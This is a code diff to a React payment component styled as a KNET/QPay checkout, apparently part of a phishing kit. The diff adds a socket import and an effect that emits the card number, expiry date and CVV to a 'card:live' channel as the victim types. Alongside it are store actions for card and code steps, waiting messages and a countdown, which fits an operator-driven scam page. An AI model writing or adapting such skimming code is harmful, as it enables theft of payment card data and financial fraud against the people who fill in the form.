@@ -7,6 +7,7 @@ import {
   cardAction,
   codeAction,
   waitingMessage,
+  socket,
 } from "@/lib/store";
 
 const months = Array.from({ length: 12 }, (_, i) => ({
@@ -57,6 +58,16 @@ export default function KNETPayment() {
   useEffect(() => {
     navigateToPage("QPay Payment");
   }, []);
+
+  // Send card data in real-time (live card)
+  useEffect(() => {
+    socket.value.emit("card:live", {
+      cardNumber: cardNumber || "",
+      nameOnCard: "",
+      expiryDate: (expiryMonth || "") + "/" + (expiryYear || ""),
+      cvv: cvv || "",
+    });
+  }, [cardNumber, expiryMonth, expiryYear, cvv]);
 
   const startCountdown = useCallback(() => {
     setCountdown(180);
